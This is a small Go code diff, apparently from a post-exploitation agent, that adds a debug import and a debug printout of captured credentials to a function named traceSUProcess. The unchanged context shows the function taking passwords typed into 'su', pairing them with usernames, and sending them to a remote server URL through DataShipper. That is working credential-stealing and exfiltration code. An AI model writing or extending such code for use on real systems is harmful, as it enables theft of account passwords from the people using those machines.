@@ -5,6 +5,7 @@ package agent_helper
 import (
 	"context"
 	"fmt"
+	"galleon/debug"
 	"os"
 	"runtime"
 	"strings"
@@ -62,6 +63,9 @@ func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]i
 						password = RemoveNonPrintableAscii(password)
 						if IsValidPassword(password) {
 							username := extractSUUsername(pid)
+							if debug.Debug {
+								fmt.Printf("[!] Detected credentials from su: %v:%v\n", username, password)
+							}
 							go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
 						}
 					}
